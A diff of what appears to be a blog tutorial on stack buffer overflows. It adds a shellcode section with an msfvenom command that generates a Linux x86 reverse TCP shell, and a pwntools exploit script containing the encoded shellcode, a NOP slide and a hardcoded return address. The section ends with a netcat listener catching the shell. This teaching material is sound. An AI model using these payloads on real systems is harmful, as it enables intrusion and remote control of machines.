@@ -191,7 +191,6 @@ Here's a nice little exploit:
 from pwn import *
 
 exe = './program'
-elf = context.binary = ELF(exe, checksec=False)
 
 payload=flat("A"*516,0x565561b9)
 
@@ -209,3 +208,92 @@ Upon running the exploit, we successfully get a system shell and can execute arb
 {{< /terminal >}}
 
 ## Shellcode
+
+The `helper` function made the exploitation very easy for us this time but, normally, we don't have such a luxury very often. Then what are we supposed to do?
+
+Well, we can put machine/shell code on the stack and then point the EIP to it to achieve code execution.
+
+![](memory-layout-shellcode.png)
+
+For now, we are going to use `msfvenom`, an automated tool to generate the shellcode for us with this command:
+{{< terminal title="Terminal" >}}
+```shell
+msfvenom -p linux/x86/shell_reverse_tcp lhost=127.0.0.1 lport=1236 -b "\x00" -f py
+```
+{{< /terminal >}}
+{{< terminal title="Terminal" >}}
+![](msfvenom.png)
+{{< /terminal >}}
+
+We will use gdb and take note of the memory address from where our buffer starts.
+{{< terminal title="Terminal" >}}
+![](stack-before1.png)
+{{< /terminal >}}
+
+We're giving dumb input (just A's) so that we can easily see our buffer.
+{{< terminal title="Terminal" >}}
+![](stack-before2.png)
+{{< /terminal >}}
+
+We can see that our buffer is starting on the second line. Keep note of the memory address `0xffffcc18`.
+
+
+### Exploitation
+
+Let's prepare our exploit:
+{{< terminal title="exploit.py" >}}
+```py
+#!/bin/python3
+from pwn import *
+
+exe = './program'
+elf = context.binary = ELF(exe, checksec=False)
+
+buf =  b""
+buf += b"\xbf\x48\x8a\xd9\x40\xd9\xec\xd9\x74\x24\xf4\x5e\x29"
+buf += b"\xc9\xb1\x12\x83\xc6\x04\x31\x7e\x0e\x03\x36\x84\x3b"
+buf += b"\xb5\xf7\x43\x4c\xd5\xa4\x30\xe0\x70\x48\x3e\xe7\x35"
+buf += b"\x2a\x8d\x68\xa6\xeb\xbd\x56\x04\x8b\xf7\xd1\x6f\xe3"
+buf += b"\x78\x22\x90\xf2\xee\x20\x90\xf0\x3a\xad\x71\x48\xa4"
+buf += b"\xfe\x20\xfb\x9a\xfc\x4b\x1a\x11\x82\x1e\xb4\xc4\xac"
+buf += b"\xed\x2c\x71\x9c\x3e\xce\xe8\x6b\xa3\x5c\xb8\xe2\xc5"
+buf += b"\xd0\x35\x38\x85"
+
+payload=flat("\x90"*16,buf,"A"*(500-len(buf)),0xffffcc18)
+
+write("payload",payload)
+```
+{{< /terminal >}}
+
+We have inserted a NOP slide (`\x90`) in the payload before the shell code.
+
+A NOP instruction tells the CPU to do nothing (and just move to next instruction). Even if the stack alignment gets changed a bit, our NOP instructions won't let our (noted) memory address go useless.
+
+Let's run the exploit to get our `payload`.
+
+We run the program with a breakpoint set and can see what's there on the stack:
+{{< terminal title="Terminal" >}}
+![](run-exploit.png)
+{{< /terminal >}}
+{{< terminal title="Terminal" >}}
+![](stack-after.png)
+{{< /terminal >}}
+
+Let's setup `netcat` listener in another terminal.
+{{< terminal title="Terminal <2>" >}}
+![](netcat1.png)
+{{< /terminal >}}
+
+Now, let's `continue`:
+{{< terminal title="Terminal" >}}
+![](run-final.png)
+{{< /terminal >}}
+
+Gdb is telling us that a new program is launched.
+
+On switching to our second terminal, the one with listener.. we can see:
+{{< terminal title="Terminal <2>" >}}
+![](netcat2.png)
+{{< /terminal >}}
+
+Vola! We got our reverse shell :fire: :sunglasses:
